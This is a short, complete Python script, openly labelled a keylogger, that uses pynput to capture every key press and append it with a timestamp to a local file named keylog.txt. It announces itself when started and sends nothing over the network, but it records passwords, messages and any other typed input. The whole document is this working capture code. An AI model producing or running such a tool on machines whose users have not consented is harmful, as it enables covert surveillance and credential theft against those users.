from pynput import keyboard
import os
from datetime import datetime

# Define the log file path
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Callback function that is called whenever a key is pressed.
    Logs the key to a file with a timestamp.
    """
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"<{key}>"

    # Write the key press to the log file with a timestamp
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"{datetime.now().isoformat()} - {key_str}\n")

def main():
    """
    Starts the keyboard listener.
    """
    print(f"[INFO] Keylogger started. Logging to '{LOG_FILE}'. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()